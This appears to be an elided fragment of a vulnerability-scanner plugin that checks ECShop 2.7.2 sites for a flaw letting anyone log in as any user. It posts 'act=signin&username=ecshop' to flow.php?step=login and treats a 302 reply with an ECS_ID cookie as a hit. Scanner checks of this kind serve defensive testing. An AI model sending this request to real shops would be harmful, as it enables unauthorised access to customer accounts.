...
def run_domain(http,ob):
    ...
    try:
        ...
        expurl="%s%s"%(url,"flow.php?step=login")
        data="act=signin&username=ecshop"
        ...
        #print content
        if res['status'] == '302' and 'ECS_ID=' in res['set-cookie']:
            #print ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
        ...
        logging.getLogger().error("File:ECShop_v272_AnyUserLogin_Script.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:ECShop_v272_AnyUserLogin_Script.py, run_domain function :" + str(e))
    #end try
